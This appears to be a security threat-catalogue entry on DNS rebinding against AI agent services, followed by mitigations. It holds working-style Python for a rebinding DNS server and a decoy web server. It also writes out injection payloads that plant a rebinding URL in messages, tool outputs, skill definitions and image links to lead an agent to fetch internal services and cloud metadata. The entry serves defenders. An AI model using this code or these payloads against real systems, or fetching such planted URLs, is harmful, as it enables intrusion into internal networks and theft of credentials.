---
id: "TS-2026-0176"
title: "DNS Rebinding Attack on Agent Services"
category: "P3"
severity: "High"
description: "An attacker uses DNS rebinding to bypass same-origin protections and URL validation in AI agent services. By controlling a domain that initially resolves to a public IP but later resolves to an internal IP, the attacker tricks the agent into making requests to internal services while passing URL allow-list checks."
date: "2026-02-26"
tags: ["dns-rebinding", "ssrf", "same-origin", "network", "bypass", "agent-services"]
---

## Overview

DNS rebinding exploits the gap between DNS resolution time and request execution time. When an agent validates a URL, the domain resolves to a safe public IP. Milliseconds later, when the agent actually makes the request, the same domain resolves to an internal IP (127.0.0.1, 10.x, 169.254.169.254). This bypasses URL allow-listing that checks "is this domain pointing to a public IP?" because the DNS answer changes between validation and use. Agent services are particularly vulnerable because they often fetch URLs provided in user messages, tool responses, or skill definitions, and apply URL safety checks that are susceptible to TOCTOU (time-of-check-to-time-of-use) races.

## Attack Vector

1. Attacker sets up a DNS server that alternates between public and internal IPs for a domain
2. Attacker provides a URL using this domain to the agent (via user input, tool response, or injected context)
3. Agent's URL validator resolves the domain → gets public IP → passes validation
4. Agent's HTTP client resolves the domain again → gets internal IP → makes request to internal service
5. Response from internal service flows back to the agent and potentially to the attacker
6. Attack bypasses all domain/IP-based URL filtering

## Technical Details

```python
import socket
import time
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import dns.resolver
import dns.rdatatype

class DNSRebindingAttack:
    """DNS rebinding attack against AI agent URL fetching."""
    
    def __init__(self, attacker_domain: str, public_ip: str, target_internal_ip: str):
        self.domain = attacker_domain
        self.public_ip = public_ip
        self.target_ip = target_internal_ip
        self.request_count = 0
    
    def dns_handler(self, query_name: str) -> str:
        """Alternating DNS response - first public, then internal."""
        self.request_count += 1
        
        if self.request_count % 2 == 1:
            # First resolution (validation check) → safe public IP
            return self.public_ip
        else:
            # Second resolution (actual request) → internal target
            return self.target_ip
    
    def setup_rebinding_dns_server(self):
        """Minimal DNS server for rebinding (using dnslib)."""
        from dnslib.server import DNSServer, BaseResolver
        from dnslib import RR, A, QTYPE
        
        attack = self
        
        class RebindResolver(BaseResolver):
            def resolve(self, request, handler):
                reply = request.reply()
                qname = str(request.q.qname).rstrip('.')
                
                if attack.domain in qname:
                    ip = attack.dns_handler(qname)
                    reply.add_answer(
                        RR(qname, QTYPE.A, rdata=A(ip), ttl=0)  # TTL=0 forces re-resolution
                    )
                return reply
        
        server = DNSServer(RebindResolver(), port=53, address="0.0.0.0")
        server.start_thread()
        return server
    
    def craft_agent_payload(self) -> dict:
        """Payloads that trigger agent URL fetching."""
        return {
            "direct_url": {
                "message": f"Can you fetch the content from https://{self.domain}/api/data?",
                "description": "Direct URL in user message"
            },
            "tool_response": {
                "tool_output": {
                    "result": "For more details, see the full report",
                    "url": f"https://{self.domain}/reports/full-analysis.json"
                },
                "description": "URL in tool response that agent follows"
            },
            "skill_definition": {
                "skill": {
                    "name": "market-data",
                    "endpoint": f"https://{self.domain}/v1/market",
                    "description": "Real-time market data API"
                },
                "description": "Malicious skill endpoint using rebinding domain"
            },
            "image_url": {
                "message": f"What's in this image? ![img](https://{self.domain}/image.png)",
                "description": "Image URL that triggers fetch; response is internal service data"
            }
        }
    
    def public_ip_server(self):
        """Server running on public IP - serves benign content for validation."""
        class SafeHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(b"<html><body>Safe content</body></html>")
            
            def do_HEAD(self):
                # HEAD requests often used for URL validation
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.send_header('Content-Length', '100')
                self.end_headers()
        
        server = HTTPServer(('0.0.0.0', 443), SafeHandler)
        server.serve_forever()
    
    def demonstrate_bypass(self):
        """Show how validation passes but request hits internal."""
        # Step 1: Agent validates URL
        validation_ip = socket.gethostbyname(self.domain)
        print(f"Validation resolves to: {validation_ip}")  # → public IP ✓
        
        is_private = ipaddress.ip_address(validation_ip).is_private
        print(f"Is private IP: {is_private}")  # → False ✓ (passes check)
        
        # Step 2: DNS cache expires (TTL=0), agent makes actual request
        time.sleep(0.1)  # Small delay, DNS cache expired
        
        request_ip = socket.gethostbyname(self.domain)  
        print(f"Request resolves to: {request_ip}")  # → internal IP!
        
        # Agent now makes request to internal IP thinking it's safe
```

## Impact

- **URL Filter Bypass**: All domain/IP-based URL validation is defeated
- **Internal Service Access**: Attacker reaches any service accessible from the agent's network
- **Metadata Service Access**: Cloud metadata endpoints (169.254.169.254) accessible via rebinding
- **Persistent Channel**: Rebinding can be repeated to maintain ongoing access to internal network
- **Chain with Other Attacks**: Combine with CSRF to modify internal service configurations

## Mitigation

1. **Resolve-and-Pin**: Resolve DNS once, validate the IP, then connect directly to that IP (not the domain)
2. **Disable DNS Cache Honoring**: Ignore low TTL values; cache DNS results for a minimum period
3. **Network-Level Blocking**: Use firewall rules to prevent agent containers from connecting to private IP ranges
4. **DNS-over-HTTPS with Pinning**: Use a trusted DNS resolver that doesn't honor attacker's low TTL
5. **Host Header Validation**: Internal services should reject requests with unexpected Host headers
6. **Connection Validation**: After TCP connection, verify the connected IP matches the validated IP
7. **Request Libraries with Rebinding Protection**: Use HTTP clients that detect IP changes between resolution and connection
8. **Allowlist Specific IPs**: Instead of validating "not private", only allow connections to explicitly approved IPs

## References

- [DNS Rebinding Attacks Explained](https://daniel.haxx.se/blog/2024/01/30/dns-rebinding-in-curl/)
- [TS-2026-0175](/skill/TS-2026-0175) — Network Segmentation Bypass via Agent Pivoting
- [Singularity of Origin - DNS Rebinding Tool](https://github.com/nccgroup/singularity)
- [OWASP SSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
